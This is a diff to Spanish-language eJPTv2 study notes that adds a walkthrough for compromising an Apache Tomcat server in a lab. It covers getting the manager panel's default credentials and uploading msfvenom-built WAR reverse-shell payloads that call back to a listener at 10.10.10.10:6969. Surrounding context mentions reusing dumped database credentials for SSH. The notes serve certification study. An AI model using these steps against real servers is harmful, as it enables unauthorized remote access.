@@ -647,7 +647,68 @@ Para ello escribiremos:
 
 Y listo, ya hemos obtenido la lista de nombres de usuario y contraseñas de la base de datos de la Webapp y ahora podríamos utilizarlos para obtener acceso a SSH, por ejemplo.   
 
-![70](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/70.jpg)     
+![70](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/70.jpg)   
+
+
+# Hacking server Tomcat 
+Supongamos que encontramos, escaneando con nmap, un servidor Tomcat.  
+
+![71](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/71.jpg)    
+
+Podemos probar a visitar la página, en este caso en http://10.10.10.15:8080 para ver qué ocurre.  
+Si no se ha cambiado la configuración por defecto, aparece una página similar a esta:  
+
+![72](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/72.jpg)   
+
+y pulsamos sobre el enlace manager-webapp se nos pide un nombre de usuario y una contraseña.  
+Ahora tenemos 2 opciones:  
+1) buscamos en Google escribiendo por ejemplo «hacktricks tomcat default credentials» y al abrir la página podemos obtener una lista de las credenciales por defecto.
+
+![73](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/73.jpg)   
+
+2) o podemos pinchar en el enlace manager-webapp y pinchar en 'cancelar' y nos devolverá un mensaje donde también aparecerán las credenciales para iniciar sesión, extraño, pero cierto.
+
+![74](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/74.jpg)     
+
+Una vez obtenidas las credenciales, puedo acceder al panel y cargar los archivos maliciosos para obtener una shell inversa.  
+
+![75](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/75.jpg)     
+
+Por lo tanto, crearemos 2 cargas útiles con msvenom, porque podría ocurrir que una de ellas no funcionara.  
+
+PAYLOAD 1   
+
+`sudo msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=6969 -f war -o file_1.war`  
+
+PAYLOAD 2    
+
+`sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=6969 -f war -o file_2.war`  
+
+Ahora cargaremos los dos archivos y veremos cuál nos permite obtener un shell inverso.  
+
+![76](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/76.jpg)    
+
+
+Una vez cargados los archivos, abrimos un shell y escuchamos en el puerto 6969 (el que se usa al crear el payload con msfvenom) y vemos qué pasa.  
+
+Con el primer payload, obtenemos un error.    
+
+![77](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/77.jpg)   
+
+Con la segunda, sin embargo, obtenemos una cáscara inversa.  
+
+![78](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/78.jpg)     
+
+Entonces habrá que tratar el tty para que funcione más cómodamente.   
+
+![79](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/79.jpg)   
+
+
+
+
+
+
+
 
 
 
